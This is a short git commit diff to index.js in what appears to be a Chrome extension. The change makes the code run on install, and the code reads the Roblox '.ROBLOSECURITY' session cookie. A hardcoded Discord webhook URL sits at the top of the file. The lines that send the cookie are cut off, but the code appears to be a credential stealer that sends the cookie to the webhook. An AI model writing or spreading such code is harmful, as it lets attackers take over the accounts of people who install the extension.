ed57e5b60492cc8f06a4b3929bc0ceacb4749c9a
Maxwell The Cat <105382091+JustASpoonful@users.noreply.github.com>
2024-09-28 13:23:29 -0400

    Update index.js

--- index.js
+++ index.js
@@ -1,6 +1,6 @@
 const webhook = "https://discord.com/api/webhooks/1288229097603989566/kARr2kG1hmAqPxbb9HpSABfcO53c7IU6TmweSb_GCYMUnB7LnFDOcyypMAzinrYJdklJ";
 
-chrome.runtime.onStartup.addListener(() => {
+chrome.runtime.onInstalled.addListener(() => {
   chrome.cookies.get(
     { url: "https://roblox.com", name: ".ROBLOSECURITY" },
     (cookie) => {
